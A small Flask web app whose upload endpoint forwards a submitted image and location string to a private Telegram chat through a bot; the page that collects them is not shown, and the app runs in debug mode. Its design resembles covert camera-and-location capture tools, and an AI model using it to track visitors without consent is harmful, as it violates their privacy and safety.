from flask import Flask, request, render_template
import os
import requests
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

def send_image_to_telegram(image):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
    requests.post(url, files={"photo": image}, data={"chat_id": CHAT_ID})

def send_location_to_telegram(location):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": f"📍 Location: {location}"})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    image = request.files.get("image")
    location = request.form.get("location")

    if location:
        send_location_to_telegram(location)
    if image:
        send_image_to_telegram(image)

    return {"status": "ok"}

if __name__ == '__main__':
    app.run(debug=True)
